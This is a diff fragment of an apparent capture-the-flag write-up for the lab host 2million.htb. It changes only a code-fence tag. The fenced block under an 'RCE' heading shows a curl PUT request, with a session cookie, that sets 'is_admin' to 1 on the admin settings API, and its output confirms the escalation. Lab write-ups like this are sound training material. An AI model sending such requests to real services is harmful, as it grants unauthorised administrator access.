@@ -234,7 +234,7 @@ ayux@pop-os:~$ curl -H "Cookie: PHPSESSID=96u52drg1tebmubh0j6p7gbc2u" http://2mi
 
 RCE
 
-```
+```console
 $ curl -H "Cookie: PHPSESSID=96u52drg1tebmubh0j6p7gbc2u" http://2million.htb/api/v1/admin/settings/update -s -X PUT -H "Content-Type: application/json" -d '{"email": "z3nshell@mail.io", "is_admin": 1}'
 {"id":13,"username":"z3nshell","is_admin":1}[ble: EOF]
 
